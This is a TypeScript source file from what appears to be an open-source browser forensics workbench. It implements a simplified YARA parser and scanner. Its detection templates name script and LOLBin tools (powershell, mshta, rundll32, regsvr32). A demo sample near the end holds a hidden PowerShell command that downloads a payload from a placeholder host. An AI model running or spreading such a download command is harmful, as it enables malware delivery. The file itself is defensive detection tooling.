/**
 * Forensics++ (ForensicsPP.com)
 * Local-first browser forensics workbench
 *
 * Copyright (c) 2026 DyNooob. All rights reserved.
 * Author: DyNooob
 * Website: https://www.loken.cn
 * Platform: DigiForensics.cn
 * Project: https://github.com/DyNooob/ForensicsPP
 *
 * Forensics++ is an open-source, browser-side toolkit for CTF/MISC,
 * lightweight forensic triage, encoding/decoding, metadata inspection,
 * hashes, archive parsing, and local analysis.
 *
 * Do not use this project for unauthorized access, intrusion,
 * privacy infringement, or unlawful activity.
 *
 * Released under the MIT License.
 * Full source code: https://github.com/DyNooob/ForensicsPP
 */

import type { YaraBatchRow, YaraRuleDef, YaraRuleResult, YaraScanResult, YaraStringDef, YaraStringHit } from "../../models";
import { hexPreview, previewText } from "../../utils/binary";
import { formatBytes } from "../../utils/files";

function splitYaraRules(ruleText: string): YaraRuleDef[] {
  const rules: YaraRuleDef[] = [];
  const regex = /\b(?:private\s+|global\s+)?rule\s+([A-Za-z_][\w]*)\s*([^{}]*)\{/g;
  let match: RegExpExecArray | null;
  while ((match = regex.exec(ruleText))) {
    const name = match[1];
    const tagText = match[2] ?? "";
    let cursor = regex.lastIndex;
    let depth = 1;
    while (cursor < ruleText.length && depth > 0) {
      const char = ruleText[cursor];
      if (char === "{") depth += 1;
      if (char === "}") depth -= 1;
      cursor += 1;
    }
    const body = ruleText.slice(regex.lastIndex, cursor - 1);
    regex.lastIndex = cursor;
    rules.push(parseYaraRuleBody(name, tagText, body));
  }
  if (!rules.length && ruleText.trim()) {
    rules.push(parseYaraRuleBody("unnamed_rule", "", ruleText));
  }
  return rules;
}

function parseYaraRuleBody(name: string, tagText: string, body: string): YaraRuleDef {
  const normalizedBody = body.replace(/\s+(?=(?:meta|strings|condition)\s*:)/gi, "\n");
  const section = (label: string) => normalizedBody.match(new RegExp(`${label}:([\\s\\S]*?)(?=\\n\\s*(?:meta|string|condition)s?:|$)`, "i"))?.[1] ?? "";
  const meta = Array.from(section("meta").matchAll(/([A-Za-z_]\w*)\s*=\s*("[^"]*"|\d+|true|false)/gi)).map((match) => [match[1], match[2].replace(/^"|"$/g, "")] as [string, string]);
  const stringsText = section("strings");
  const condition = section("condition").trim() || "any of them";
  const strings: YaraStringDef[] = [];
  const errors: string[] = [];
  const definitions = stringsText.matchAll(/(\$[A-Za-z_][\w]*)\s*=\s*("(?:\\"|[^"])*"|\{[^}]+\}|\/(?:\\\/|[^/])+\/)([\s\S]*?)(?=\s+\$[A-Za-z_][\w]*\s*=|$)/g);
  for (const item of definitions) {
    const id = item[1];
    const value = item[2].trim();
    const modifiers = item[3].trim().split(/\s+/).filter(Boolean);
    if (value.startsWith('"')) strings.push({ id, kind: "text", pattern: value.slice(1, -1).replace(/\\"/g, '"'), modifiers });
    else if (value.startsWith("{")) strings.push({ id, kind: "hex", pattern: value.slice(1, -1).trim(), modifiers });
    else if (value.startsWith("/")) strings.push({ id, kind: "regex", pattern: value.slice(1, -1), modifiers });
  }
  return {
    name,
    namespace: "default",
    tags: tagText.split(":").slice(1).join(":").trim().split(/\s+/).filter(Boolean),
    meta,
    strings,
    condition,
    errors
  };
}

function findBytePattern(data: Uint8Array, pattern: Uint8Array) {
  const offsets: number[] = [];
  if (!pattern.length) return offsets;
  for (let offset = 0; offset <= data.length - pattern.length && offsets.length < 200; offset += 1) {
    let ok = true;
    for (let index = 0; index < pattern.length; index += 1) {
      if (data[offset + index] !== pattern[index]) {
        ok = false;
        break;
      }
    }
    if (ok) offsets.push(offset);
  }
  return offsets;
}

function findMaskedBytePattern(data: Uint8Array, pattern: Array<{ value: number; mask: number }>) {
  const offsets: number[] = [];
  if (!pattern.length) return offsets;
  for (let offset = 0; offset <= data.length - pattern.length && offsets.length < 200; offset += 1) {
    let ok = true;
    for (let index = 0; index < pattern.length; index += 1) {
      const token = pattern[index];
      if ((data[offset + index] & token.mask) !== (token.value & token.mask)) {
        ok = false;
        break;
      }
    }
    if (ok) offsets.push(offset);
  }
  return offsets;
}

function yaraTextBytes(value: string, wide: boolean) {
  if (!wide) return new TextEncoder().encode(value);
  const bytes = new Uint8Array(value.length * 2);
  for (let index = 0; index < value.length; index += 1) {
    bytes[index * 2] = value.charCodeAt(index) & 0xff;
    bytes[index * 2 + 1] = value.charCodeAt(index) >> 8;
  }
  return bytes;
}

function parseYaraHexPattern(pattern: string) {
  const tokens = pattern.split(/\s+/).filter(Boolean);
  if (tokens.some((token) => token.startsWith("[") || token.includes("|") || token.includes("(") || token.includes(")"))) return null;
  const parsed = tokens.map((token) => {
    const normalized = token.toUpperCase();
    if (!/^[0-9A-F?]{1,2}$/.test(normalized)) return null;
    const padded = normalized.length === 1 ? `?${normalized}` : normalized;
    const hi = padded[0];
    const lo = padded[1];
    const value = (hi === "?" ? 0 : Number.parseInt(hi, 16) << 4) | (lo === "?" ? 0 : Number.parseInt(lo, 16));
    const mask = (hi === "?" ? 0x00 : 0xf0) | (lo === "?" ? 0x00 : 0x0f);
    return { value, mask };
  });
  if (parsed.some((token) => token == null || !Number.isFinite(token.value))) return null;
  return parsed as Array<{ value: number; mask: number }>;
}

function yaraHitContexts(data: Uint8Array, offsets: number[], matchLength: number) {
  return offsets.slice(0, 12).map((offset) => {
    const start = Math.max(0, offset - 32);
    const end = Math.min(data.length, offset + Math.max(1, matchLength) + 48);
    const context = previewText(data.slice(start, end), 180).replace(/\s+/g, " ").trim();
    return `0x${offset.toString(16).toUpperCase()}: ${context || hexPreview(data.slice(start, end), 96)}`;
  });
}

function yaraFullwordBoundary(data: Uint8Array, offset: number, length: number) {
  const isWord = (byte: number | undefined) => byte != null && ((byte >= 0x30 && byte <= 0x39) || (byte >= 0x41 && byte <= 0x5a) || (byte >= 0x61 && byte <= 0x7a) || byte === 0x5f);
  return !isWord(data[offset - 1]) && !isWord(data[offset + length]);
}

function scanYaraString(def: YaraStringDef, data: Uint8Array, text: string): YaraStringHit {
  let offsets: number[] = [];
  let matchLength = def.pattern.length || 1;
  const modifiers = new Set(def.modifiers.map((item) => item.toLowerCase()));
  if (def.kind === "text") {
    const variants = [yaraTextBytes(def.pattern, false)];
    if (modifiers.has("wide")) variants.push(yaraTextBytes(def.pattern, true));
    if (modifiers.has("nocase")) {
      variants.push(yaraTextBytes(def.pattern.toLowerCase(), false), yaraTextBytes(def.pattern.toUpperCase(), false));
      if (modifiers.has("wide")) variants.push(yaraTextBytes(def.pattern.toLowerCase(), true), yaraTextBytes(def.pattern.toUpperCase(), true));
    }
    const variantHits = variants.flatMap((variant) => findBytePattern(data, variant).map((offset) => ({ offset, length: variant.length })));
    const filtered = modifiers.has("fullword") ? variantHits.filter((hit) => yaraFullwordBoundary(data, hit.offset, hit.length)) : variantHits;
    matchLength = variants[0]?.length ?? matchLength;
    offsets = Array.from(new Set(filtered.map((hit) => hit.offset))).sort((a, b) => a - b).slice(0, 200);
  } else if (def.kind === "hex") {
    const pattern = parseYaraHexPattern(def.pattern);
    matchLength = pattern?.length ?? matchLength;
    offsets = pattern ? findMaskedBytePattern(data, pattern) : [];
  } else {
    try {
      const flags = modifiers.has("nocase") ? "gi" : "g";
      const regex = new RegExp(def.pattern, flags);
      const matches = Array.from(text.matchAll(regex));
      matchLength = matches[0]?.[0]?.length || matchLength;
      offsets = matches.map((match) => match.index ?? 0).slice(0, 200);
    } catch {
      offsets = [];
    }
  }
  return {
    id: def.id,
    pattern: def.kind === "hex" ? `{ ${def.pattern} }` : def.pattern,
    count: offsets.length,
    offsets,
    preview: offsets.slice(0, 12).map((offset) => `0x${offset.toString(16).toUpperCase()}`).join(", ") || "--",
    contexts: yaraHitContexts(data, offsets, matchLength)
  };
}

function lintYaraRule(rule: YaraRuleDef) {
  const warnings = [...rule.errors];
  const supportedModifiers = new Set(["ascii", "wide", "nocase", "fullword"]);
  const ids = rule.strings.map((item) => item.id);
  const duplicateIds = ids.filter((id, index) => ids.indexOf(id) !== index);
  if (duplicateIds.length) warnings.push(`Duplicate string identifiers: ${Array.from(new Set(duplicateIds)).join(", ")}`);
  if (!rule.strings.length) warnings.push("Rule has no strings; condition may be too broad for triage.");
  for (const item of rule.strings) {
    const unsupported = item.modifiers.filter((modifier) => !supportedModifiers.has(modifier.toLowerCase()));
    if (unsupported.length) warnings.push(`${item.id} unsupported modifiers: ${unsupported.join(", ")}`);
    if (item.kind === "hex" && !parseYaraHexPattern(item.pattern)) warnings.push(`Unsupported hex pattern in ${item.id}: jumps/alternatives are not implemented`);
    if (item.kind === "regex") {
      try {
        new RegExp(item.pattern, item.modifiers.some((modifier) => modifier.toLowerCase() === "nocase") ? "i" : "");
      } catch (error) {
        warnings.push(`${item.id} invalid regex: ${error instanceof Error ? error.message : String(error)}`);
      }
    }
  }
  const referenced = Array.from(rule.condition.matchAll(/\$[A-Za-z_][\w]*/g)).map((match) => match[0]);
  const missing = referenced.filter((id) => !ids.includes(id));
  if (missing.length) warnings.push(`Condition references undefined strings: ${Array.from(new Set(missing)).join(", ")}`);
  if (/for\s+any|for\s+all|at\s+\d+|in\s+\(/i.test(rule.condition)) warnings.push("Condition uses advanced YARA operators; this local helper evaluates a practical subset only.");
  return warnings;
}

function evaluateYaraCondition(condition: string, hits: YaraStringHit[], fileSize: number) {
  const hitMap = new Map(hits.map((hit) => [hit.id, hit.count > 0]));
  const normalized = condition.replace(/\s+/g, " ").trim();
  if (/^true$/i.test(normalized)) return { matched: true, score: "true" };
  if (/^false$/i.test(normalized)) return { matched: false, score: "false" };
  if (/filesize\s*[<>]=?\s*\d+/i.test(normalized)) {
    const expr = normalized.match(/filesize\s*([<>]=?)\s*(\d+)/i);
    if (expr) {
      const value = Number(expr[2]);
      const ok = expr[1] === ">" ? fileSize > value : expr[1] === ">=" ? fileSize >= value : expr[1] === "<" ? fileSize < value : fileSize <= value;
      if (!/\$|any|all|\d+\s+of/i.test(normalized)) return { matched: ok, score: `filesize ${expr[1]} ${value}` };
    }
  }
  if (/all of them/i.test(normalized)) return { matched: hits.length > 0 && hits.every((hit) => hit.count > 0), score: `${hits.filter((hit) => hit.count > 0).length}/${hits.length}` };
  if (/any of them/i.test(normalized)) return { matched: hits.some((hit) => hit.count > 0), score: `${hits.filter((hit) => hit.count > 0).length}/${hits.length}` };
  const nOf = normalized.match(/(\d+)\s+of\s+them/i);
  if (nOf) {
    const need = Number(nOf[1]);
    const got = hits.filter((hit) => hit.count > 0).length;
    return { matched: got >= need, score: `${got}/${need}` };
  }
  const ids = Array.from(normalized.matchAll(/\$[A-Za-z_][\w]*/g)).map((match) => match[0]);
  if (ids.length) {
    const jsExpr = normalized
      .replace(/\b(?:and)\b/gi, "&&")
      .replace(/\b(?:or)\b/gi, "||")
      .replace(/\b(?:not)\b/gi, "!")
      .replace(/\$[A-Za-z_][\w]*/g, (id) => String(hitMap.get(id) ?? false));
    try {
      if (/^[\s!&|()truefals]+$/i.test(jsExpr)) return { matched: Boolean(Function(`return (${jsExpr})`)()), score: ids.map((id) => `${id}=${hitMap.get(id) ? "hit" : "miss"}`).join(", ") };
    } catch {
      return { matched: ids.some((id) => hitMap.get(id)), score: "condition fallback" };
    }
  }
  return { matched: hits.some((hit) => hit.count > 0), score: "fallback:any" };
}

function runYaraScan(ruleText: string, data: Uint8Array, name: string): YaraScanResult {
  const text = previewText(data, Math.min(data.length, 4_000_000));
  const rules = splitYaraRules(ruleText);
  const results = rules.map((rule) => {
    const hits = rule.strings.map((item) => scanYaraString(item, data, text));
    const condition = evaluateYaraCondition(rule.condition, hits, data.length);
    return {
      rule,
      matched: condition.matched,
      score: condition.score,
      hits,
      condition: rule.condition,
      errors: lintYaraRule(rule)
    };
  });
  const matched = results.filter((item) => item.matched);
  const warnings = results.flatMap((item) => item.errors.map((error) => `${item.rule.name}: ${error}`));
  const findings = [
    matched.length ? { level: "warn", title: "YARA rule matched", detail: matched.map((item) => item.rule.name).join(", ") } : { level: "info", title: "No rule matched", detail: `${results.length} rule(s) scanned.` },
    ...warnings.map((warning) => ({ level: "warn", title: "YARA subset warning", detail: warning }))
  ];
  return {
    rows: [
      ["Sample", name],
      ["Size", formatBytes(data.length)],
      ["Rules", String(results.length)],
      ["Matched", String(matched.length)],
      ["Strings", String(results.reduce((sum, item) => sum + item.rule.strings.length, 0))],
      ["String hits", String(results.reduce((sum, item) => sum + item.hits.reduce((inner, hit) => inner + hit.count, 0), 0))],
      ["Warnings", String(warnings.length)]
    ],
    results,
    findings,
    warnings
  };
}

function yaraHitsToCsv(results: YaraRuleResult[]) {
  const escape = (value: unknown) => {
    const text = String(value);
    return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, "\"\"")}"` : text;
  };
  return [
    ["rule", "matched", "string_id", "pattern", "count", "offsets", "contexts"].join(","),
    ...results.flatMap((result) => result.hits.map((hit) => [
      result.rule.name,
      result.matched ? "yes" : "no",
      hit.id,
      hit.pattern,
      hit.count,
      hit.preview,
      hit.contexts.join(" | ")
    ].map(escape).join(",")))
  ].join("\n");
}

function yaraBatchRowsToCsv(rows: YaraBatchRow[]) {
  const escape = (value: string | number) => {
    const text = String(value);
    return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, "\"\"")}"` : text;
  };
  return [
    ["name", "size_bytes", "matched_rules", "match_count", "string_hits", "warnings"].join(","),
    ...rows.map((row) => [
      row.name,
      row.size,
      row.matchedRules.join("; "),
      row.matchCount,
      row.stringHits,
      row.warnings.join("; ")
    ].map(escape).join(","))
  ].join("\n");
}

const yaraRuleTemplates = [
  {
    id: "phishing",
    label: "Phishing / Credential",
    rule: 'rule phishing_or_credential_clues : phishing credential {\n  meta:\n    author = "Forensics++"\n    description = "Credential and phishing wording, URL, script markers"\n  strings:\n    $password = "password" nocase ascii wide\n    $login = "login" nocase ascii wide\n    $verify = "verify" nocase ascii wide\n    $url = /https?:\\/\\/[^\\s\\"\\\']+/ nocase\n    $ps = "powershell" nocase ascii wide\n    $hta = "mshta" nocase ascii wide\n  condition:\n    2 of them\n}'
  },
  {
    id: "windows-script",
    label: "Windows Script",
    rule: 'rule windows_script_execution_clues : windows script {\n  strings:\n    $cmd = "cmd.exe" nocase ascii wide\n    $ps = "powershell" nocase ascii wide\n    $wscript = "wscript" nocase ascii wide\n    $cscript = "cscript" nocase ascii wide\n    $rundll = "rundll32" nocase ascii wide\n    $regsvr = "regsvr32" nocase ascii wide\n    $mz = { 4D 5A }\n  condition:\n    any of them\n}'
  },
  {
    id: "office-macro",
    label: "Office Macro",
    rule: 'rule office_macro_suspicious_strings : office macro {\n  strings:\n    $autoopen = "AutoOpen" nocase ascii wide\n    $documentopen = "Document_Open" nocase ascii wide\n    $shell = "Shell" nocase ascii wide\n    $createobject = "CreateObject" nocase ascii wide\n    $http = "http" nocase ascii wide\n  condition:\n    2 of them\n}'
  }
];

const defaultYaraSample = [
  "Subject: Account verification required",
  "Please verify your login at https://example-login.test/session",
  "Attached note:",
  "powershell -nop -w hidden -c Invoke-WebRequest http://example.test/payload.exe",
  "password reset token: demo-token-123"
].join("\n");

export { defaultYaraSample, runYaraScan, yaraBatchRowsToCsv, yaraHitsToCsv, yaraRuleTemplates };
